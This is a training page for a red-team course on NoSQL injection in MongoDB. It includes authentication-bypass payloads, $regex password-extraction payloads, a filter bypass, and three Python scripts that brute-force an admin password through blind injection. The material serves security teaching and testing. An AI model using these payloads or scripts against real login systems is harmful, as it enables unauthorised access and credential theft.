---
layout: training-page
title: "NoSQL Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - nosql
  - mongodb
  - injection
  - authentication-bypass
  - blind-injection
page_key: "web-nosql-injection"
render_with_liquid: false
---

# NoSQL Injection

NoSQL databases provide looser consistency restrictions than traditional SQL databases, trading relational constraints for performance and scalability. While they do not use SQL syntax, they are still vulnerable to injection attacks. NoSQL injection typically exploits JSON-based query operators — particularly in MongoDB — to manipulate queries in ways the developer did not intend.

## Tools

- **NoSQLMap** — Automated NoSQL database enumeration and exploitation — `github.com/codingo/NoSQLMap`
- **Burp-NoSQLiScanner** — Burp Suite extension for NoSQL injection discovery — `github.com/matrix/Burp-NoSQLiScanner`
- **nosqlilab** — Practice lab for NoSQL injection — `github.com/digininja/nosqlilab`

## MongoDB Operator Injection

MongoDB uses JSON query operators that begin with `$`. When user input is parsed as JSON and inserted directly into a query, attackers can inject these operators to manipulate query logic:

| Operator | Description |
| --- | --- |
| `$ne` | Not equal — matches documents where the field is not equal to the specified value |
| `$gt` | Greater than — matches documents where the field is greater than the specified value |
| `$lt` | Less than — matches documents where the field is less than the specified value |
| `$regex` | Regular expression — matches documents where the field matches the pattern |
| `$nin` | Not in — matches documents where the field value is not in the specified array |
| `$in` | In — matches documents where the field value is in the specified array |
| `$eq` | Equal — explicit equality match |

Example: a product search that takes user input directly:

```
db.products.find({ "price": userInput })
```

Injecting `{ "$gt": 0 }` transforms the query to return all products with price greater than zero, leaking the entire catalogue instead of a specific product:

```
db.products.find({ "price": { "$gt": 0 } })
```

## Authentication Bypass

The most impactful NoSQL injection technique. By injecting comparison operators, you can log in without knowing any credentials.

### HTTP Parameter Injection (URL-encoded body)

```
# Not-equal bypass — any username/password that is not "toto"
username[$ne]=toto&password[$ne]=toto

# Regex wildcard on username with not-equal on password
login[$regex]=a.*&pass[$ne]=lol

# Range bypass — username alphabetically between "admin" and "test"
login[$gt]=admin&login[$lt]=test&pass[$ne]=1

# Not-in bypass — any user that is not admin or test
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

### JSON Body Injection

```
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## Extract Data with $regex

The `$regex` operator can be used to extract data character by character. When the regex matches the actual value, the server responds differently (e.g., redirects to a dashboard vs. showing an error).

### Extract Password Length

```
# Test if password is exactly 1 character long
username[$ne]=toto&password[$regex]=.{1}

# Test if password is exactly 3 characters long
username[$ne]=toto&password[$regex]=.{3}
```

### Extract Password Characters

```
# HTTP parameter form — enumerate password starting with 'm'
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

# JSON form — enumerate admin password
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### Extract Using $in

Test a set of common username values at once:

```
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

## WAF and Filter Bypass

In MongoDB, if a document contains duplicate keys, only the last occurrence takes precedence. This can be used to override pre-conditions set by the application:

```
{"id":"10", "id":"100"}
```

The effective query uses `id: "100"`, discarding the application-set value of `"10"`.

## Blind NoSQL Injection — Automated Extraction

When there is no direct error output, use boolean-based blind injection. The scripts below brute-force the password one character at a time by observing whether the server responds with success or failure.

### POST with JSON Body (Python)

```
import requests
import urllib3
import string

urllib3.disable_warnings()

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char: %s" % (password + c))
                password += c
```

### POST with URL-encoded Body (Python)

```
import requests
import urllib3
import string

urllib3.disable_warnings()

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '&', '$']:
            payload = 'user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char: %s" % (password + c))
                password += c
```

### GET Request (Python)

```
import requests
import string

username = 'admin'
password = ''
url = 'http://example.org/login'

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            payload = f"?username={username}&password[$regex]=^{password + c}"
            r = requests.get(url + payload)
            if 'Yeah' in r.text:
                print(f"Found one more char: {password + c}")
                password += c
```

## Detection Tips

To identify NoSQL injection points, probe the application with operator characters:

```
# Inject not-equal operator into a login form parameter
username=admin'&password[$ne]=x

# Inject a regex operator
username=admin&password[$regex]=.*

# Check for JSON body parsing — try:
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Error-based: send invalid operator types and observe errors
{"username": {"$invalidop": "test"}}
```

## Resources

- PayloadsAllTheThings — NoSQL Injection — `github.com/swisskyrepo/PayloadsAllTheThings`
- NoSQLMap — Automated Exploitation Tool — `github.com/codingo/NoSQLMap`
- NoSQL injection wordlists — cr0hn — `github.com/cr0hn/nosqlinjection_wordlists`
- OWASP Testing for NoSQL Injection — `owasp.org/www-project-web-security-testing-guide`
- MongoDB NoSQL Injection with Aggregation Pipelines — Soroush Dalili — `soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines`
